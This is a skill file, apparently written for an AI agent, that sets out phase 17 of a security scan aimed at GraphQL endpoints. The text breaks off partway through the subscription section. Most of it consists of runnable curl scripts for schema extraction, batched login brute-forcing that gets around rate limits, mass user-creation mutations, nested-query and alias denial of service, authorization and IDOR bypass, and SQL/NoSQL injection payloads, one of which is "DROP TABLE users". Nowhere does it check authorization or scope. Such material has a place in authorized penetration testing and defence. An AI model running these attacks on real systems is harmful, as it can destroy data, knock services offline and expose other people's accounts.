---
name: scan-fase-17
description: Execute FASE 17 - GraphQL Deep Testing. Comprehensive GraphQL security testing including introspection exploitation, batch attacks, nested query DoS, alias overloading, directive abuse, and authorization bypass. Uses reverse engineering to reconstruct schemas when introspection is disabled. Applies threat modeling and behavioral analysis to discover GraphQL-specific vulnerabilities. Adapts dynamically to each GraphQL implementation (Apollo, Hasura, Supabase pg_graphql, AWS AppSync, custom). Invoke with /scan-fase-17 {url}.
---

# FASE 17: GraphQL Deep Testing - Advanced Exploitation

Comprehensive GraphQL security testing that goes beyond basic introspection. This phase uses advanced techniques from reverse engineering, threat modeling, and behavioral analysis to discover GraphQL-specific vulnerabilities that automated tools miss.

**Why GraphQL Security is Different:**
- GraphQL exposes a SINGLE endpoint with unlimited query flexibility
- Introspection can reveal the ENTIRE API schema in one request
- Batching and aliasing enable AMPLIFICATION attacks
- Nested queries can cause exponential resource consumption (N+1 problem)
- Authorization often fails at field/resolver level, not just endpoint level

**Applicability**: Only execute if FASE 2 detected GraphQL endpoint. Common patterns:
- `/graphql`
- `/api/graphql`
- `/v1/graphql`
- Supabase: `/graphql/v1`
- Hasura: `/v1/graphql`
- AWS AppSync: Custom endpoint

**Universal Compatibility**: This skill works with ANY GraphQL implementation:
- **Supabase**: pg_graphql (PostgREST-based)
- **Hasura**: Hasura GraphQL Engine
- **Apollo**: Apollo Server (Node.js)
- **AWS AppSync**: Managed GraphQL
- **Yoga/Mercurius**: Node.js alternatives
- **Strawberry/Ariadne**: Python GraphQL
- **graphql-ruby**: Ruby GraphQL
- **gqlgen**: Go GraphQL
- **Custom**: Any GraphQL implementation

---

## Prerequisites

- FASE 0 completed (backend detection)
- FASE 2 completed (GraphQL endpoint detected and confirmed)
- FASE 1 recommended (API keys extracted for authenticated testing)
- GraphQL endpoint URL identified
- Previous phase findings documented in `clients/{name}/SCAN-IN-PROGRESS.md`

---

## CRITICAL: Adaptive Exploration Mindset

**This skill provides STARTING POINTS, not limitations. Every GraphQL implementation is UNIQUE.**

### Core Principles

1. **Introspection first, but don't stop there** - Even with introspection disabled, schema can be reconstructed
2. **Think about authorization at every level** - Query, mutation, field, argument
3. **Resource consumption is a weapon** - Batching, nesting, aliasing can DoS
4. **Every field is a potential leak** - Hidden fields, debug fields, internal types
5. **Errors reveal structure** - Error messages often expose schema details
6. **Subscriptions are often forgotten** - Real-time = real-time data leaks

### Reverse Engineering Approach

Apply reverse engineering methodology when introspection is disabled:

```yaml
reverse_engineering_graphql:
  1_reconnaissance:
    - Identify GraphQL endpoint
    - Check if introspection enabled
    - Analyze error messages for type hints
    - Monitor client requests for query patterns

  2_static_analysis:
    - Extract queries from JS bundles
    - Find hardcoded GraphQL operations
    - Identify fragment definitions
    - Map known types from client code

  3_schema_reconstruction:
    - Use field suggestion attacks
    - Brute force common field names
    - Analyze error responses for valid fields
    - Build partial schema from discoveries

  4_exploitation:
    - Test authorization on discovered fields
    - Attempt mutations without proper auth
    - Test batch/nested attacks
    - Exploit discovered vulnerabilities
```

### Threat Modeling Approach (STRIDE for GraphQL)

```yaml
stride_graphql:
  spoofing:
    - "Can I query as another user via variables?"
    - "Can I bypass auth via batch queries?"
    - "Can I use subscription as different user?"

  tampering:
    - "Can I modify data via mutations without auth?"
    - "Can I inject SQL/NoSQL via GraphQL variables?"
    - "Can I tamper with persisted queries?"

  repudiation:
    - "Are mutations logged properly?"
    - "Can I batch mutations to avoid rate limiting?"
    - "Can I use aliases to hide malicious queries?"

  information_disclosure:
    - "Does introspection reveal sensitive types?"
    - "Do error messages expose internal details?"
    - "Can I access hidden/deprecated fields?"

  denial_of_service:
    - "Can I crash the server with nested queries?"
    - "Can I exhaust resources with batch requests?"
    - "Can I cause N+1 query problems?"

  elevation_of_privilege:
    - "Can I access admin mutations?"
    - "Can I query fields I shouldn't see?"
    - "Can I use directives to bypass checks?"
```

### Behavioral Analysis Approach

```yaml
behavioral_analysis_graphql:
  error_pattern_analysis:
    - Collect all unique error messages
    - Map errors to validation rules
    - Identify type system from errors
    - Find authorization vs validation errors

  timing_analysis:
    - Measure query response times
    - Identify expensive resolvers
    - Find N+1 query patterns
    - Detect rate limiting thresholds

  response_analysis:
    - Compare authenticated vs anonymous responses
    - Check for field-level authorization
    - Identify partial data exposure
    - Find inconsistent authorization
```

### When You Find Something NOT in the Checklist

**ALWAYS document unexpected findings:**

```yaml
unexpected_finding:
  type: "{finding_type}"
  graphql_specific: true
  description: "Detailed description"

  discovery_method:
    technique: "{introspection|field_suggestion|error_analysis|js_bundle}"
    observation: "What led to this discovery"

  exploitation:
    query: |
      query ExploitQuery {
        sensitiveField {
          secret
        }
      }
    variables: {}
    result: "Returned sensitive data without authentication"

  impact: "Data exposure / DoS / Authorization bypass"
  severity: "CRITICAL"
  poc: |
    curl -X POST "https://target.com/graphql" \
      -H "Content-Type: application/json" \
      -d '{"query": "{ sensitiveField { secret } }"}'

  added_to_report: true
```

---

## Phase Overview

### Core Checklist (17.1-17.5)
| Phase | Test | Technique | Priority |
|-------|------|-----------|----------|
| 17.1 | Introspection Completa | Schema Extraction | CRITICAL |
| 17.2 | Batch Attacks | Resource Amplification | HIGH |
| 17.3 | Nested Query Attacks (N+1) | DoS via Complexity | CRITICAL |
| 17.4 | Alias Overloading | Query Amplification | HIGH |
| 17.5 | Directive Abuse | Logic Bypass | MEDIUM |

### Extended GraphQL Exploitation (17.6-17.10) - Deep Exploration
| Phase | Test | Technique | Priority |
|-------|------|-----------|----------|
| 17.6 | Schema Reconstruction | Field Suggestion Attack | HIGH |
| 17.7 | Authorization Bypass | Field/Resolver Level Auth | CRITICAL |
| 17.8 | Injection via GraphQL | SQL/NoSQL Injection | CRITICAL |
| 17.9 | Subscription Exploitation | Real-time Data Leak | HIGH |
| 17.10 | IDOR via GraphQL | Object Reference Manipulation | CRITICAL |

---

## Phase 17.1: Introspection Completa

### Objective
Extract the complete GraphQL schema using introspection to map all types, queries, mutations, and subscriptions available.

### Execution

```bash
GRAPHQL_URL="https://target.com/graphql"
ANON_KEY="..."  # If Supabase
ACCESS_TOKEN="..."  # If authenticated

# === Test 17.1.1: Full schema extraction ===
echo "=== Extracting complete GraphQL schema ==="

# Full introspection query
INTROSPECTION_QUERY='{"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name description fields(includeDeprecated: true) { name description args { name description type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } defaultValue } type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } isDeprecated deprecationReason } inputFields { name description type { kind name ofType { kind name ofType { kind name } } } defaultValue } interfaces { kind name ofType { kind name } } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { kind name ofType { kind name } } } directives { name description locations args { name description type { kind name ofType { kind name ofType { kind name } } } defaultValue } } } }"}'

curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "apikey: $ANON_KEY" \
  -d "$INTROSPECTION_QUERY" | jq '.' > scan-workspace/graphql/full_schema.json

# === Test 17.1.2: Extract all queries ===
echo "=== Extracting all queries ==="

curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "apikey: $ANON_KEY" \
  -d '{"query": "{ __schema { queryType { fields { name description args { name type { name } } type { name kind ofType { name } } } } } }"}' \
  | jq '.data.__schema.queryType.fields[] | {name, args: [.args[].name], returnType: .type.name // .type.ofType.name}'

# === Test 17.1.3: Extract all mutations ===
echo "=== Extracting all mutations ==="

curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "apikey: $ANON_KEY" \
  -d '{"query": "{ __schema { mutationType { fields { name description args { name type { name } } type { name kind } } } } }"}' \
  | jq '.data.__schema.mutationType.fields[] | {name, args: [.args[].name]}'

# === Test 17.1.4: Find undocumented/hidden types ===
echo "=== Looking for hidden/internal types ==="

curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "apikey: $ANON_KEY" \
  -d '{"query": "{ __schema { types { name kind description } } }"}' \
  | jq '.data.__schema.types[] | select(.name | startswith("__") | not) | select(.kind != "SCALAR") | {name, kind, description}'
```

### Supabase pg_graphql Specific

```bash
SUPABASE_URL="https://xxx.supabase.co"
ANON_KEY="..."

# Supabase GraphQL endpoint
GRAPHQL_URL="$SUPABASE_URL/graphql/v1"

# Extract all collections (tables exposed via GraphQL)
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "apikey: $ANON_KEY" \
  -d '{"query": "{ __schema { queryType { fields { name } } } }"}' \
  | jq '.data.__schema.queryType.fields[].name' \
  | grep -E "Collection$"

# Each table becomes {tableName}Collection
# e.g., profiles -> profilesCollection
```

### Hasura Specific

```bash
# Hasura often exposes admin introspection
HASURA_URL="https://target.hasura.app/v1/graphql"
ADMIN_SECRET="..."  # If discovered

# With admin secret
curl -X POST "$HASURA_URL" \
  -H "Content-Type: application/json" \
  -H "x-hasura-admin-secret: $ADMIN_SECRET" \
  -d '{"query": "{ __schema { types { name } } }"}'

# Check for exposed metadata
curl "$HASURA_URL/../v1/metadata" \
  -H "x-hasura-admin-secret: $ADMIN_SECRET"
```

### Introspection Disabled Detection

```bash
# If introspection returns error, note it
RESPONSE=$(curl -s -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}')

if echo "$RESPONSE" | grep -qi "introspection"; then
  echo "INTROSPECTION DISABLED - Proceed to 17.6 for schema reconstruction"
else
  echo "INTROSPECTION ENABLED - Extract full schema"
fi
```

### Output

```yaml
phase_17_1:
  status: completed

  introspection:
    enabled: {true|false}
    blocked_reason: "{if disabled}"

  schema_extraction:
    types_found: {number}
    queries_found: {number}
    mutations_found: {number}
    subscriptions_found: {number}

  sensitive_types:
    - name: "User"
      fields: ["id", "email", "password_hash", "role"]
      risk: "Password hash exposed"

    - name: "AdminSettings"
      fields: ["api_keys", "secrets"]
      risk: "Admin-only type accessible"

  hidden_types:
    - name: "_InternalAudit"
      risk: "Internal type exposed"

  deprecated_fields:
    - type: "User"
      field: "legacyPassword"
      risk: "Old auth system exposed"

  severity: "{based on exposed types}"
```

---

## Phase 17.2: Batch Attacks

### Objective
Test if the GraphQL endpoint allows batch queries/mutations that can amplify attacks or bypass rate limiting.

### Execution

```bash
GRAPHQL_URL="https://target.com/graphql"

# === Test 17.2.1: Batch query in single request ===
echo "=== Testing batch queries ==="

# Method 1: Array of operations
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ user(id: 1) { email } }"},
    {"query": "{ user(id: 2) { email } }"},
    {"query": "{ user(id: 3) { email } }"},
    {"query": "{ user(id: 4) { email } }"},
    {"query": "{ user(id: 5) { email } }"}
  ]'

# Method 2: Multiple operations in one query (aliases)
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ u1: user(id: 1) { email } u2: user(id: 2) { email } u3: user(id: 3) { email } }"}'

# === Test 17.2.2: Batch mutations (dangerous!) ===
echo "=== Testing batch mutations ==="

# Create 100 records in one request
BATCH_MUTATION='{"query": "mutation BatchCreate { '
for i in {1..100}; do
  BATCH_MUTATION+="m$i: createUser(input: {email: \"test$i@test.com\"}) { id } "
done
BATCH_MUTATION+='}"}'

curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d "$BATCH_MUTATION"

# === Test 17.2.3: Complexity limit testing ===
echo "=== Testing query complexity limits ==="

# Increasingly complex queries
for COUNT in 10 50 100 500 1000; do
  QUERY='{"query": "{ '
  for i in $(seq 1 $COUNT); do
    QUERY+="a$i: __typename "
  done
  QUERY+='}"}'

  RESPONSE=$(curl -s -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    -d "$QUERY")

  if echo "$RESPONSE" | grep -qi "complexity\|limit\|too many"; then
    echo "BLOCKED at $COUNT operations"
    break
  else
    echo "ALLOWED: $COUNT operations"
  fi
done
```

### Rate Limiting Bypass via Batching

```bash
# Test if batch requests bypass rate limiting
echo "=== Testing rate limit bypass via batching ==="

# Normal: 10 separate requests (might hit rate limit)
for i in {1..10}; do
  curl -s -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    -d '{"query": "mutation { login(email: \"test@test.com\", password: \"wrong'$i'\") { token } }"}' &
done
wait

# Batched: 10 operations in 1 request (might bypass)
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "mutation { login(email: \"test@test.com\", password: \"wrong1\") { token } }"},
    {"query": "mutation { login(email: \"test@test.com\", password: \"wrong2\") { token } }"},
    {"query": "mutation { login(email: \"test@test.com\", password: \"wrong3\") { token } }"},
    {"query": "mutation { login(email: \"test@test.com\", password: \"wrong4\") { token } }"},
    {"query": "mutation { login(email: \"test@test.com\", password: \"wrong5\") { token } }"},
    {"query": "mutation { login(email: \"test@test.com\", password: \"wrong6\") { token } }"},
    {"query": "mutation { login(email: \"test@test.com\", password: \"wrong7\") { token } }"},
    {"query": "mutation { login(email: \"test@test.com\", password: \"wrong8\") { token } }"},
    {"query": "mutation { login(email: \"test@test.com\", password: \"wrong9\") { token } }"},
    {"query": "mutation { login(email: \"test@test.com\", password: \"wrong10\") { token } }"}
  ]'
```

### Output

```yaml
phase_17_2:
  status: completed

  batch_attacks:
    array_batching_allowed: {true|false}
    alias_batching_allowed: {true|false}
    max_batch_size: {number or "unlimited"}

  mutations_batched:
    allowed: {true|false}
    records_created: {number}
    impact: "Created 100 records in single request"

  complexity_limits:
    limit_exists: {true|false}
    blocked_at: {number}
    error_message: "{message}"

  rate_limit_bypass:
    bypassed: {true|false}
    method: "batch array"
    impact: "10 login attempts in 1 request"

  severity: "{based on findings}"
```

---

## Phase 17.3: Nested Query Attacks (N+1 Problem)

### Objective
Test for denial of service vulnerabilities through deeply nested queries that cause exponential database queries (N+1 problem).

### Execution

```bash
GRAPHQL_URL="https://target.com/graphql"

# === Test 17.3.1: Deep nesting (5+ levels) ===
echo "=== Testing nested query depth ==="

# Pattern: user -> posts -> comments -> author -> posts -> comments...
# Each level multiplies database queries

# Level 3 nesting
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { posts { comments { id } } } }"}'

# Level 5 nesting
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { posts { comments { author { posts { id } } } } } }"}'

# Level 7 nesting (likely to cause issues)
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { posts { comments { author { posts { comments { author { id } } } } } } } }"}'

# === Test 17.3.2: Circular reference exploitation ===
echo "=== Testing circular references ==="

# If user has friends who are also users
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { friends { friends { friends { friends { friends { id } } } } } } }"}'

# === Test 17.3.3: Measure response time for DoS potential ===
echo "=== Measuring response time by depth ==="

for DEPTH in 1 2 3 4 5 6 7; do
  QUERY='{"query": "{ users '
  for i in $(seq 1 $DEPTH); do
    QUERY+='{ posts '
  done
  QUERY+='{ id }'
  for i in $(seq 1 $DEPTH); do
    QUERY+=' }'
  done
  QUERY+=' }"}'

  START=$(date +%s%3N)
  RESPONSE=$(curl -s -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    -d "$QUERY" 2>&1)
  END=$(date +%s%3N)
  DURATION=$((END - START))

  echo "Depth $DEPTH: ${DURATION}ms"

  # Check for timeout or error
  if echo "$RESPONSE" | grep -qi "timeout\|error\|depth"; then
    echo "BLOCKED at depth $DEPTH"
    break
  fi

  # If response time grows exponentially, it's vulnerable
  if [ $DURATION -gt 5000 ]; then
    echo "WARNING: Response time > 5s at depth $DEPTH - DoS potential"
  fi
done
```

### Supabase pg_graphql Nesting

```bash
# Supabase uses different syntax
SUPABASE_GRAPHQL="https://xxx.supabase.co/graphql/v1"
ANON_KEY="..."

# Test nested relations
curl -X POST "$SUPABASE_GRAPHQL" \
  -H "Content-Type: application/json" \
  -H "apikey: $ANON_KEY" \
  -d '{"query": "{ profilesCollection { edges { node { id posts: postsCollection { edges { node { comments: commentsCollection { edges { node { author { id } } } } } } } } } } }"}'
```

### Output

```yaml
phase_17_3:
  status: completed

  nested_query_tests:
    max_depth_allowed: {number}
    depth_limit_enforced: {true|false}

  timing_analysis:
    - depth: 1
      response_time_ms: 50
    - depth: 3
      response_time_ms: 200
    - depth: 5
      response_time_ms: 2500
    - depth: 7
      response_time_ms: "timeout"

  exponential_growth: {true|false}
  dos_potential: "{LOW|MEDIUM|HIGH|CRITICAL}"

  circular_references:
    detected: {true|false}
    exploitable: {true|false}

  severity: "{based on DoS potential}"
```

---

## Phase 17.4: Alias Overloading

### Objective
Test if the GraphQL endpoint can be overwhelmed by queries with many aliases, causing resource exhaustion.

### Execution

```bash
GRAPHQL_URL="https://target.com/graphql"

# === Test 17.4.1: Create query with 1000 aliases ===
echo "=== Testing alias overloading ==="

# Generate query with N aliases
generate_alias_query() {
  COUNT=$1
  QUERY='{"query": "{ '
  for i in $(seq 1 $COUNT); do
    QUERY+="alias$i: __typename "
  done
  QUERY+='}"}'
  echo "$QUERY"
}

# Test increasing alias counts
for COUNT in 10 100 500 1000 5000; do
  QUERY=$(generate_alias_query $COUNT)

  START=$(date +%s%3N)
  RESPONSE=$(curl -s -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    -d "$QUERY" 2>&1)
  END=$(date +%s%3N)
  DURATION=$((END - START))

  if echo "$RESPONSE" | grep -qi "error\|limit\|too many"; then
    echo "BLOCKED at $COUNT aliases"
    break
  else
    echo "ALLOWED: $COUNT aliases in ${DURATION}ms"
  fi
done

# === Test 17.4.2: Expensive field with many aliases ===
echo "=== Testing expensive field alias overloading ==="

# If there's an expensive computed field
QUERY='{"query": "{ '
for i in $(seq 1 100); do
  QUERY+="a$i: expensiveComputation(input: \"test$i\") "
done
QUERY+='}"}'

curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d "$QUERY"
```

### Output

```yaml
phase_17_4:
  status: completed

  alias_overloading:
    max_aliases_allowed: {number or "unlimited"}
    alias_limit_enforced: {true|false}
    blocked_at: {number}

  timing_by_alias_count:
    - count: 10
      response_time_ms: 20
    - count: 100
      response_time_ms: 50
    - count: 1000
      response_time_ms: 500
    - count: 5000
      response_time_ms: "timeout/blocked"

  dos_potential: "{severity}"
  severity: "{based on findings}"
```

---

## Phase 17.5: Directive Abuse

### Objective
Test for vulnerabilities in GraphQL directive handling that could bypass security controls or cause unexpected behavior.

### Execution

```bash
GRAPHQL_URL="https://target.com/graphql"

# === Test 17.5.1: @skip and @include abuse ===
echo "=== Testing @skip/@include directives ==="

# Try to bypass field-level authorization with @skip
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { id email @skip(if: false) sensitiveField @include(if: true) } }"}'

# Test with variables
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query GetUser($showSensitive: Boolean!) { user(id: 1) { id email sensitiveField @include(if: $showSensitive) } }",
    "variables": {"showSensitive": true}
  }'

# Test boolean coercion
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { sensitiveField @skip(if: null) } }"}'

# === Test 17.5.2: Custom directive discovery ===
echo "=== Discovering custom directives ==="

# Get all directives from schema
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { directives { name description locations args { name type { name } } } } }"}' \
  | jq '.data.__schema.directives[]'

# Test common custom directives
CUSTOM_DIRECTIVES=("@auth" "@permission" "@admin" "@internal" "@deprecated" "@cache" "@rateLimit")

for DIRECTIVE in "${CUSTOM_DIRECTIVES[@]}"; do
  echo "Testing $DIRECTIVE..."
  RESPONSE=$(curl -s -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"{ user(id: 1) { id $DIRECTIVE } }\"}")

  if ! echo "$RESPONSE" | grep -qi "unknown directive"; then
    echo "DIRECTIVE EXISTS: $DIRECTIVE"
  fi
done

# === Test directive on mutations ===
echo "=== Testing directives on mutations ==="

curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { createUser(input: {email: \"test@test.com\"}) @skip(if: false) { id } }"}'
```

### Hasura Directive Testing

```bash
# Hasura has special directives
HASURA_URL="https://target.hasura.app/v1/graphql"

# Test @cached directive
curl -X POST "$HASURA_URL" \
  -H "Content-Type: application/json" \
  -d '{"query": "query @cached(ttl: 300) { users { id } }"}'

# Test permission bypass attempts
curl -X POST "$HASURA_URL" \
  -H "Content-Type: application/json" \
  -H "x-hasura-role: admin" \
  -d '{"query": "{ users { id password_hash } }"}'
```

### Output

```yaml
phase_17_5:
  status: completed

  builtin_directives:
    skip_abuse:
      result: "{VULNERABLE|BLOCKED}"
      bypass_achieved: {true|false}
    include_abuse:
      result: "{VULNERABLE|BLOCKED}"
      bypass_achieved: {true|false}

  custom_directives_found:
    - name: "@auth"
      description: "Requires authentication"
      bypassable: {true|false}
    - name: "@admin"
      description: "Admin only"
      bypassable: {true|false}

  directive_on_mutations:
    allowed: {true|false}
    behavior: "{description}"

  severity: "{based on bypass potential}"
```

---

## Phase 17.6: Schema Reconstruction (Extended - When Introspection Disabled)

### Objective
Reconstruct GraphQL schema when introspection is disabled using field suggestion attacks, error analysis, and JS bundle extraction.

### Execution

```bash
GRAPHQL_URL="https://target.com/graphql"

# === Field Suggestion Attack ===
echo "=== Field suggestion attack ==="

# Many GraphQL servers suggest valid fields on typos
COMMON_FIELDS=("id" "email" "name" "user" "users" "admin" "password" "token" "secret" "role" "status" "created" "updated")

for FIELD in "${COMMON_FIELDS[@]}"; do
  # Try field with typo
  RESPONSE=$(curl -s -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"{ ${FIELD}x }\"}")

  # Check if error suggests valid field
  if echo "$RESPONSE" | grep -qi "did you mean\|suggestions\|valid fields"; then
    echo "FIELD SUGGESTION: $FIELD"
    echo "$RESPONSE" | grep -oE "Did you mean[^?]*" || echo "$RESPONSE" | grep -oE "suggestions.*"
  fi
done

# === Brute force root query fields ===
echo "=== Brute forcing root query fields ==="

ROOT_QUERIES=("user" "users" "me" "viewer" "admin" "node" "nodes" "search" "query" "posts" "comments" "orders" "products" "accounts" "profiles" "settings" "config")

for QUERY in "${ROOT_QUERIES[@]}"; do
  RESPONSE=$(curl -s -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"{ $QUERY { id } }\"}")

  if ! echo "$RESPONSE" | grep -qi "cannot query field\|unknown field"; then
    echo "VALID ROOT QUERY: $QUERY"
  fi
done

# === Extract from JS bundles ===
echo "=== Extracting queries from JS bundles ==="

# Download main JS bundle (find URL from page source)
JS_URL="https://target.com/assets/main.js"
curl -s "$JS_URL" -o /tmp/bundle.js

# Extract GraphQL queries
grep -oE 'query\s+\w+\s*(\([^)]*\))?\s*\{[^}]+\}' /tmp/bundle.js > scan-workspace/graphql/extracted_queries.txt
grep -oE 'mutation\s+\w+\s*(\([^)]*\))?\s*\{[^}]+\}' /tmp/bundle.js > scan-workspace/graphql/extracted_mutations.txt
grep -oE 'fragment\s+\w+\s+on\s+\w+\s*\{[^}]+\}' /tmp/bundle.js > scan-workspace/graphql/extracted_fragments.txt

# Extract gql template literals
grep -oE 'gql`[^`]+`' /tmp/bundle.js >> scan-workspace/graphql/extracted_queries.txt
```

### Output

```yaml
phase_17_6:
  status: completed

  schema_reconstruction:
    introspection_disabled: true
    fields_discovered: {count}
    queries_discovered: {count}
    mutations_discovered: {count}

  discovery_methods:
    field_suggestion:
      fields_found: [{list}]
    error_analysis:
      types_inferred: [{list}]
    js_bundle_extraction:
      queries_found: {count}
      fragments_found: {count}

  reconstructed_schema:
    types:
      - name: "User"
        fields: ["id", "email", "name"]
    queries:
      - "user(id: ID!): User"
      - "users: [User]"
    mutations:
      - "createUser(input: CreateUserInput!): User"

  severity: "INFO (reconnaissance value)"
```

---

## Phase 17.7: Authorization Bypass (Extended)

### Objective
Test for authorization failures at query, field, and resolver levels in GraphQL.

### Execution

```bash
GRAPHQL_URL="https://target.com/graphql"
USER_TOKEN="..."  # Normal user token
ADMIN_QUERY="{ adminUsers { id email role } }"

# === Query-level authorization ===
echo "=== Testing query-level authorization ==="

# Try admin query without token
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d "{\"query\": \"$ADMIN_QUERY\"}"

# Try admin query with normal user token
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d "{\"query\": \"$ADMIN_QUERY\"}"

# === Field-level authorization ===
echo "=== Testing field-level authorization ==="

# Can normal user see sensitive fields?
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query": "{ user(id: 1) { id email password_hash api_key secret_token } }"}'

# === Horizontal authorization (IDOR) ===
echo "=== Testing horizontal authorization ==="

# Can user A access user B's data?
for USER_ID in 1 2 3 100 999; do
  RESPONSE=$(curl -s -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -d "{\"query\": \"{ user(id: $USER_ID) { id email } }\"}")

  if echo "$RESPONSE" | grep -q "email"; then
    echo "ACCESSIBLE: User ID $USER_ID"
  fi
done

# === Mutation authorization ===
echo "=== Testing mutation authorization ==="

# Can normal user use admin mutations?
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query": "mutation { updateUserRole(userId: 1, role: \"admin\") { id role } }"}'

curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query": "mutation { deleteUser(id: 999) { id } }"}'
```

### Output

```yaml
phase_17_7:
  status: completed

  authorization_tests:
    query_level:
      admin_queries_accessible: {true|false}
      anonymous_access: {true|false}

    field_level:
      sensitive_fields_exposed:
        - field: "password_hash"
          accessible_to: "authenticated users"
        - field: "api_key"
          accessible_to: "anonymous"

    horizontal_authorization:
      other_users_accessible: {true|false}
      accessible_user_ids: [{list}]

    mutation_authorization:
      admin_mutations_accessible: {true|false}
      dangerous_mutations: [{list}]

  severity: "CRITICAL"
```

---

## Phase 17.8: Injection via GraphQL (Extended)

### Objective
Test for SQL injection, NoSQL injection, and other injection attacks through GraphQL variables and arguments.

### Execution

```bash
GRAPHQL_URL="https://target.com/graphql"

# === SQL Injection via variables ===
echo "=== Testing SQL injection ==="

SQL_PAYLOADS=(
  "' OR '1'='1"
  "'; DROP TABLE users;--"
  "1; SELECT * FROM users--"
  "1 UNION SELECT username,password FROM users--"
)

for PAYLOAD in "${SQL_PAYLOADS[@]}"; do
  echo "Testing: $PAYLOAD"
  curl -s -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"{ user(id: \\\"$PAYLOAD\\\") { id email } }\"}"
done

# Via variables (safer input but still test)
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query GetUser($id: ID!) { user(id: $id) { id email } }",
    "variables": {"id": "1 OR 1=1"}
  }'

# === NoSQL Injection ===
echo "=== Testing NoSQL injection ==="

NOSQL_PAYLOADS=(
  '{"$ne": null}'
  '{"$gt": ""}'
  '{"$where": "this.password == this.password"}'
)

for PAYLOAD in "${NOSQL_PAYLOADS[@]}"; do
  curl -s -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"{ users(filter: $PAYLOAD) { id } }\"}"
done

# === Filter/search injection ===
echo "=== Testing filter injection ==="

curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users(where: {email: {_like: \"%@%\"}}) { id email } }"}'

# Hasura-style injection
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users(where: {_or: [{id: {_eq: 1}}, {id: {_eq: 2}}]}) { id } }"}'
```

### Output

```yaml
phase_17_8:
  status: completed

  injection_tests:
    sql_injection:
      vulnerable: {true|false}
      payload: "{working payload}"
      error_based: {true|false}
      blind: {true|false}

    nosql_injection:
      vulnerable: {true|false}
      payload: "{working payload}"

    filter_injection:
      vulnerable: {true|false}
      exposed_data: "{description}"

  severity: "{CRITICAL if any injection works}"
```

---

## Phase 17.9: Subscription Exploitation (Extended)

### Objective
Test GraphQL subscriptions for data leakage and unauthorized access to real-time updates.

### Execution

```bash
GRAPHQL_WS="wss://target.com/graphql"
ACCESS_TOKEN="..."

# === WebSocket connection for subscriptions ===
# Using websocat or wscat

# Install: npm install -g wscat
# Or: cargo install websocat

# === Test subscription without auth ===
echo "=== Testing subscription without authentication ==="

wscat -c "$GRAPHQL_WS" << 'EOF'
{"type": "connection_init", "payload": {}}
{"type": "start", "id": "1", "payload": {"query": "subscription { userUpdated { id email } }"}}
EOF

# === Test subscription with auth ===
echo "=== Testing subscription with authentication ==="

wscat -c "$GRAPHQL_WS" << EOF
{"type": "connection_init", "payload": {"Authorization": "Bearer $ACCESS_TOKEN"}}
{"type": "start", "id": "1", "payload": {"query": "subscription { userUpdated { id email } }"}}
EOF

# === Test subscribing to other users' events ===
echo "=== Testing subscription to other users ==="

wscat -c "$GRAPHQL_WS" << 'EOF'
{"type": "connection_init", "payload": {}}
